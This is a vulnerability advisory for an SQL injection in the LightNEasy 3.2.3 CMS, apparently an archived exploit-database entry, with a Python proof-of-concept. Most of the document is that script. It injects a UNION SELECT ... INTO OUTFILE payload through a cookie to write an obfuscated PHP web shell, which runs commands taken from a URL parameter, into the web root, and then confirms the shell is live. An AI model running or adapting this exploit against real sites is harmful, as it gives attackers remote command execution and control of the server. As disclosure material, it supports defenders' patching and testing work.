source: http://www.securityfocus.com/bid/47541/info

LightNEasy is prone to an SQL-injection vulnerability because it fails to sufficiently sanitize user-supplied data before using it in an SQL query.

Exploiting this issue could allow an attacker to compromise the application, access or modify data, or exploit latent vulnerabilities in the underlying database.

LightNEasy 3.2.3 is vulnerable; other versions may also be affected. 

# ------------------------------------------------------------------------
# Software................LightNEasy 3.2.3
# Vulnerability...........SQL Injection
# Threat Level............Critical (4/5)
# Download................http://www.lightneasy.org/
# Discovery Date..........4/21/2011
# Tested On...............Windows Vista + XAMPP
# ------------------------------------------------------------------------
# Author..................AutoSec Tools
# Site....................http://www.autosectools.com/
# Email...................John Leitch <john@autosectools.com>
# ------------------------------------------------------------------------
# 
# 
# --Description--
# 
# A SQL injection vulnerability in LightNEasy 3.2.3 can be exploited to
# extract arbitrary data. In some environments it may be possible to
# create a PHP shell.
# 
# 
# --PoC--

import socket

host = 'localhost'
path = '/lne323'
shell_path = '/shell.php'
port = 80

def upload_shell():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host, port))
    s.settimeout(8)    

    s.send('POST ' + path + '/index.php?do=&page= HTTP/1.1\r\n'
           'Host: localhost\r\n'
           'Proxy-Connection: keep-alive\r\n'
           'User-Agent: x\r\n'
           'Content-Length: 73\r\n'
           'Cache-Control: max-age=0\r\n'
           'Origin: null\r\n'
           'Content-Type: multipart/form-data; boundary=----x\r\n'
           'Cookie: userhandle=%22UNION/**/SELECT/**/CONCAT(char(60),char(63),char(112),char(104),char(112),char(32),char(115),char(121),char(115),char(116),char(101),char(109),char(40),char(36),char(95),char(71),char(69),char(84),char(91),char(39),char(67),char(77),char(68),char(39),char(93),char(41),char(59),char(32),char(63),char(62)),%22%22,%22%22,%22%22,%22%22,%22%22,%22%22,%22%22,%22%22,%22%22,%22%22/**/FROM/**/dual/**/INTO/**/OUTFILE%22../../htdocs/shell.php%22%23\r\n'
           'Accept: text/html\r\n'
           'Accept-Language: en-US,en;q=0.8\r\n'
           'Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.3\r\n'
           '\r\n'
           '------x\r\n'
           'Content-Disposition: form-data; name="submit"\r\n'
           '\r\n'
           '\r\n'
           '------x--\r\n'
           '\r\n')

    resp = s.recv(8192)
 
    http_ok = 'HTTP/1.1 200 OK'
    
    if http_ok not in resp[:len(http_ok)]:
        print 'error uploading shell'
        return
    else: print 'shell uploaded'

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host, port))
    s.settimeout(8)     
 
    s.send('GET ' + shell_path + ' HTTP/1.1\r\n'\
           'Host: ' + host + '\r\n\r\n')

    if http_ok not in s.recv(8192)[:len(http_ok)]: print 'shell not found'        
    else: print 'shell located at http://' + host + shell_path

upload_shell()

